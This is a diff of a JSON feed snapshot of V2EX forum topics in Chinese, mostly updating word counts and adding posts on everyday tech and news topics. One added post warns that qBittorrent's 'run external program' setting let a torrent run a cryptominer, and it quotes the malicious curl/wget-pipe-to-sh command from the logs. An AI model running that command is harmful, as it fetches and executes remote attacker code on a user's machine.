@@ -292,6 +292,46 @@
       "siteUrl": "https://www.v2ex.com/",
       "articles": [
         {
+          "id": "https://www.v2ex.com/t/1105709",
+          "author": "Sanarara",
+          "description": "Sanarara: - 在昨天下班回家后，听见 nas 怪吵，看了下探针 CPU50%，检查进程，qbittorrent 进程极为活跃，但是没有正在下载的内容。平时一直用 rss 自动挂 sukebei ，确认过确实没有活跃任务，这就活见鬼了。\n- ssh 中 top 了一下，b3qmud4h 这个进程跑的飞起，怀疑有问题，互联网上搜索一圈，b3qmud4h 为自动生成的字段。\n- kill -9 该进程后，cpu 恢复正常，qb 服务也没出现问题\n- 重启 qbittorrent ，再次出现高 cpu 占用进程，同样为随机字符的任务。\n- 检查 qbittorrent 日志，发现  “运行外部程序。Torrent：“*********”。命令：`sh -c \"(curl -skL https://files.synotech.studio || wget --no-check-certificate -qO - https://files.synotech.studio) | sh\"`”\n- 通过搜索，得知设置→下载→运行外部程序 选项如果打勾的话，是可以通过种子直接运行脚本的\n- 大家务必检查一下这个设置是否开启，我的印象里是没有认为开启过，可能和包或者是 docker 镜像有关",
+          "link": "https://www.v2ex.com/t/1105709",
+          "publishedOn": "2025-01-17T00:28:47.000Z",
+          "wordCount": 1095,
+          "title": "要注意， qBittorrent 自动运行 torrent 传播的挖矿脚本",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105708",
+          "author": "um6uih",
+          "description": "um6uih: 我装完 armbian 也运行了安装到 emmc 的命令，armbian-install ，也有进度，最后说成功了，让我拔出 u 盘，poweroff ，然后开机\n等开机就进安卓那个绿色的小人的恢复模式，试了三次了都是这样\n有没有大佬知道这是啥原因？",
+          "link": "https://www.v2ex.com/t/1105708",
+          "publishedOn": "2025-01-17T00:27:29.000Z",
+          "wordCount": 435,
+          "title": "n1 盒子 u 盘装完 armbian 为啥拔了 u 盘回进安卓系统的恢复模式啊？",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105707",
+          "author": "roundRobin",
+          "description": "roundRobin: \n所有订单都减 20%，，这得多离谱才能让这个功能上线。不过在实名制下是不是都得算不当得利被追回？\nref: https://www.guancha.cn/politics/2025_01_16_762334.shtml",
+          "link": "https://www.v2ex.com/t/1105707",
+          "publishedOn": "2025-01-16T23:25:49.000Z",
+          "wordCount": 643,
+          "title": "支付宝这次的 Bug 有点严重啊",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.v2ex.com/t/1105706",
+          "author": "licong",
+          "description": "licong: 人在京都，大阪准备最后一天回去的时候去逛一下",
+          "link": "https://www.v2ex.com/t/1105706",
+          "publishedOn": "2025-01-16T22:40:12.000Z",
+          "wordCount": 487,
+          "title": "现在日本有什么好买的？",
+          "imageUrl": null
+        },
+        {
           "id": "https://www.v2ex.com/t/1105705",
           "author": "ly1878",
           "description": "ly1878: 如题，无论是在 FaceTime 中呼出普通手机电话，还是用 PopClip 快捷键或者是网页右键弹出的号码拨打，都拨打不成功，右上角会出现确认是否呼叫的界面，但是点了绿色的按钮后就没有任何变化。有时候点了按钮后会启动浏览器，也没有页面内容。\n通过手机拨打，再将信号传到 Mac 上，可以用 Mac 进行通话，但是直接在 Mac 上拨打就是不行\n想问下是我什么设置没处理好吗？还望大佬指点。",
@@ -307,7 +347,7 @@
           "description": "toptyloo: \nhttps://variety.com/2025/film/news/david-lynch-dead-director-blue-velvet-twin-peaks-1236276106/David Lynch\nhttps://www.facebook.com/davidlynchofficial/posts/pfbid04LuZED6SrWevszQ1UZoEED6x95znKc7scJxXFL5B1icBKgCiu4T2qYLHsErFNzELl",
           "link": "https://www.v2ex.com/t/1105704",
           "publishedOn": "2025-01-16T18:55:58.000Z",
-          "wordCount": 393,
+          "wordCount": 397,
           "title": "David Lynch 去世",
           "imageUrl": null
         },
@@ -317,7 +357,7 @@
           "description": "jsomin: \n支付宝官方发文：\n昨天下午由于我们的一个失误，导致小部分用户在支付时享受了立减优惠，有用户发了这个截图，关心我们会不会把优惠追回。\n有几个事实在此澄清：\n1 、支付宝官方没有发送任何资金追回短信，如果你收到了下图短信，千万不要点，以免上当受骗,也请大家帮忙相互转告。\n2 、失误是怎么发生的？其实是我们在支付宝某个常规营销活动后台配错了营销模板，把优惠额度和优惠金类型都写错了。\n3 、既然是我们的错，成本和责任必须我们自己承担。针对已经发出的营销优惠金，支付宝不会向用户追款，请大家安心。\n提前祝大家假期愉快~\n微博原文链接： https://weibo.com/1891502860/5123605060913184\nhttps://i.imgur.com/GAeYk7N.jpeg\nhttps://i.imgur.com/cPSb8II.jpeg",
           "link": "https://www.v2ex.com/t/1105703",
           "publishedOn": "2025-01-16T18:10:18.000Z",
-          "wordCount": 583,
+          "wordCount": 591,
           "title": "（支付宝事故后续）承诺不会向用户追款",
           "imageUrl": null
         },
@@ -357,7 +397,7 @@
           "description": "pig198x: \n美国 cn2 的 VPS ，奈何 IP 被 OpenAI 降智了，想套上一个 Cloudflare warp 用，在网上找了一键脚本，装上之后，IP 地址变 Cloudflare 了，但是速度奇慢无比，大概几十 k/s   有人知道这大概什么原因造成的吗？ 谢谢。",
           "link": "https://www.v2ex.com/t/1105699",
           "publishedOn": "2025-01-16T17:18:15.000Z",
-          "wordCount": 639,
+          "wordCount": 641,
           "title": "VPS 上套了 Cloudflare warp，速度狂慢，最有可能的状况是什么？",
           "imageUrl": null
         },
@@ -367,7 +407,7 @@
           "description": "voidless: 最近 MacBook 的网络连接有种时断时续的感觉，每隔几分钟就断流一次，具体表现就是看直播浏览网页每隔几分钟就卡顿一次，同个网络环境下另一台 PC 打开相同的直播加载同样的网页一直很流畅，不知道 Mac 上哪里出了问题，求问有哪些排查的方法或者工具",
           "link": "https://www.v2ex.com/t/1105697",
           "publishedOn": "2025-01-16T16:35:13.000Z",
-          "wordCount": 341,
+          "wordCount": 398,
           "title": "MacBook 网络连接有点断断续续的，请问有哪些排查的工具",
           "imageUrl": null
         },
@@ -417,7 +457,7 @@
           "description": "steen1mango: \n当然 Duolingo 只是一个掺杂了很多游戏元素的教育类应用，但是是不是娱乐性更多一些（比如用背单词升级闯关的 rpg 类游戏），就会被出版署定义为“网络游戏”？我不太清楚这个临界点在哪里，希望有了解的朋友解答一下。感谢！\n国家新闻出版署 2009 年通知：网络游戏是指所有通过互联网(包括有线互联网和移动通讯网络等)供公众在线交互使用或提供下载的互联网游戏作品。主要包括但不限于：大型角色扮演类网络游戏(MMORPG)、网页游戏(WebGame)、休闲游戏、单机游戏的网上下载、具有联网功能的游戏、联网的对战游戏平台、手机网络游戏。",
           "link": "https://www.v2ex.com/t/1105690",
           "publishedOn": "2025-01-16T15:19:37.000Z",
-          "wordCount": 352,
+          "wordCount": 361,
           "title": "类似 Duolingo 的应用，在国内上架移动端需要游戏版号吗",
           "imageUrl": null
         },
@@ -427,7 +467,7 @@
           "description": "JoonSumisu: \n由于笔记本插着电源的时间占比可能比较长，所以想问下见多识广的各位有没有类似的联想平板那样，跳过电池直接供电功能的笔记本推荐\n现在看到机械革命有个叫做服务器模式有类似的功效\n另外的希望满足的需求：\n大小 13-14 寸\n支持 hdmi in （如果有 kvm out 就更好了，好像 GPD Pocket 3 有....）\n有 rj45\n硬盘最好能自己加\n然后屏幕好一点\n性能方面，需要性能的部分都尽可能都交给远端机来做。能上网不卡，vscode 不卡，续航长点就好了",
           "link": "https://www.v2ex.com/t/1105689",
           "publishedOn": "2025-01-16T15:05:36.000Z",
-          "wordCount": 395,
+          "wordCount": 397,
           "title": "求推荐笔记本，想问下现在哪些笔记本有类似旁路充电的功能",
           "imageUrl": null
         },
@@ -437,7 +477,7 @@
           "description": "maymay5: \n我的应用场景：作为我系统的一个依赖，用于存储用户使用系统过程中产生的图片\n要求\n必须支持 API 调用上传和下载以及删除\n轻量一点\n最好能支持 COS ，OBS ，OSS 等对象存储(这个功能可以是付费的)\n如果不止图片，能支持文件床就更好了\n为什么不直接用对象存储？\n说不出为啥，就觉得单独弄一个系统比较正式，方便管理\n谢谢大家！！",
           "link": "https://www.v2ex.com/t/1105688",
           "publishedOn": "2025-01-16T15:02:38.000Z",
-          "wordCount": 445,
+          "wordCount": 451,
           "title": "请问大家有推荐的开源图床吗",
           "imageUrl": null
         },
@@ -477,7 +517,7 @@
           "description": "zhj9709: A B 可以直连，B C 可以直连，为什么 A C 不能通过 B 中转连接，而是要通过 derp 服务器？",
           "link": "https://www.v2ex.com/t/1105682",
           "publishedOn": "2025-01-16T14:18:37.000Z",
-          "wordCount": 587,
+          "wordCount": 609,
           "title": "关于 tailscale 的一些疑问",
           "imageUrl": null
         },
@@ -487,7 +527,7 @@
           "description": "TSENG: # 用了一年多的 wise ，突然要地址证明\n之前注册的时候地址的乱填的，没想那么多。\n要改会国区吗？但改回国区，信用卡就不能用了。\n还是走淘宝地址认证呢？但又听说地址认证后还有可能要居留证认证。\n有没有好哥们分享一下经历？",
           "link": "https://www.v2ex.com/t/1105681",
           "publishedOn": "2025-01-16T14:10:46.000Z",
-          "wordCount": 449,
+          "wordCount": 459,
           "title": "用了一年多的 wise ，突然要地址证明",
           "imageUrl": null
         },
@@ -507,7 +547,7 @@
           "description": "kirieievk: \n否则还要跑一趟麻烦. 为啥规定只能 90 天以内.",
           "link": "https://www.v2ex.com/t/1105678",
           "publishedOn": "2025-01-16T13:48:12.000Z",
-          "wordCount": 506,
+          "wordCount": 519,
           "title": "驾照只能提前 90 天更新吗,春节回去想更新,但是还没到 90 天",
           "imageUrl": null
         },
@@ -517,7 +557,7 @@
           "description": "heavymetals: \nNintendo Switch 2 予告映像\n老任也是坐不住了...不知道首发游戏是不是跟泄漏的一样是马车 9 和荒野大镖客。\n希望性能能好一点\n任天堂 Switch 新款总结要点\n向下兼容任天堂 Switch 1 代游戏。\n外观与任天堂 Switch OLED 类似，屏幕由 7 寸扩大到 8 寸，分辨率由 720p 提升到 1080p 。机身变大，厚度没什么变化，依旧轻薄。\n散热采用双风扇设计。\n机身上方加了一个 USB-C 接口。\n新款 Joy-Con 手柄随机身变大而变大，滑轨锁扣改为磁吸卡扣。摇杆和按钮更大，背部多了 2 个按钮。\n2025 年发售。\n2025 年 4 月 2 日有直面会公布更多细节。\n来源：点击这里查看链接",
           "link": "https://www.v2ex.com/t/1105677",
           "publishedOn": "2025-01-16T13:36:55.000Z",
-          "wordCount": 550,
+          "wordCount": 552,
           "title": "任天堂发布 Switch 2 预告片，并宣布于 2025.4.2 展开直面会",
           "imageUrl": null
         },
@@ -527,7 +567,7 @@
           "description": "awendujitang: 大家有没有让人上头的小游戏，简单而且让人上瘾，可以告诉我吗？让我玩一下。😝",
           "link": "https://www.v2ex.com/t/1105675",
           "publishedOn": "2025-01-16T13:21:01.000Z",
-          "wordCount": 676,
+          "wordCount": 718,
           "title": "大家有没有让人上头的小游戏，简单而且让人上瘾",
           "imageUrl": null
         },
@@ -537,7 +577,7 @@
           "description": "drymonfidelia:",
           "link": "https://www.v2ex.com/t/1105674",
           "publishedOn": "2025-01-16T13:14:11.000Z",
-          "wordCount": 530,
+          "wordCount": 542,
           "title": "如果抽卡游戏用的不是密码学安全的随机数算法（我觉得大部分游戏都不是），是不是有可能从客户端控制服务器的随机抽卡结果？",
           "imageUrl": null
         },
@@ -597,7 +637,7 @@
           "description": "dzjx: \n类似于 Chrome 下的 Yet Another Drag and Go ，左键点住超链接后往旁边一拖，就可以打开新标签。适用于找资料的时候同时打开多个标签。\n刚刚在搜索引擎里找了半天，发现 Safari 下面居然没有类似的插件。鼠标中键按地手疼...",
           "link": "https://www.v2ex.com/t/1105665",
           "publishedOn": "2025-01-16T12:22:34.000Z",
-          "wordCount": 417,
+          "wordCount": 382,
           "title": "2025 年了， Safari 下有手势拖拽插件吗",
           "imageUrl": null
         },
@@ -627,7 +667,7 @@
           "description": "SachinBeyond: 彩礼都带回去了,还另外有不少嫁妆, 钱和女人都拿了 .可遇不可求吧?",
           "link": "https://www.v2ex.com/t/1105661",
           "publishedOn": "2025-01-16T11:45:13.000Z",
-          "wordCount": 591,
+          "wordCount": 619,
           "title": "有多少人是 彩礼一分不留,还另外带嫁妆(钱)的?",
           "imageUrl": null
         },
@@ -639,36 +679,6 @@
           "publishedOn": "2025-01-16T11:40:47.000Z",
           "wordCount": 426,
           "title": "求推荐个 MacBook 用的无线或者蓝牙耳机",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105658",
-          "author": "qqqtz",
-          "description": "qqqtz: 追加贷（纯信用）\n额度:10 － 50 万\n还款方式:等额，先息\n年限:等额 8 年，先息 3 － 5 年\n月利息:1.63 厘（ 10 万元一个月利息 163 元）",
-          "link": "https://www.v2ex.com/t/1105658",
-          "publishedOn": "2025-01-16T11:38:35.000Z",
-          "wordCount": 454,
-          "title": "工行追加贷有什么坑",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105657",
-          "author": "wsping",
-          "description": "wsping: \n京东预约了下，随便就买到了。",
-          "link": "https://www.v2ex.com/t/1105657",
-          "publishedOn": "2025-01-16T11:37:39.000Z",
-          "wordCount": 390,
-          "title": "3599 的 Mac mini 4 丐版好像很容易买到？",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.v2ex.com/t/1105656",
-          "author": "ocsp",
-          "description": "ocsp: 位置深圳，前天刚上门刷过身份证查过房，今天换个人来又敲门，不要太搞笑。。",
-          "link": "https://www.v2ex.com/t/1105656",
-          "publishedOn": "2025-01-16T11:25:42.000Z",
-          "wordCount": 476,
-          "title": "网格员们开始查房扰民了",
           "imageUrl": null
         }
       ]
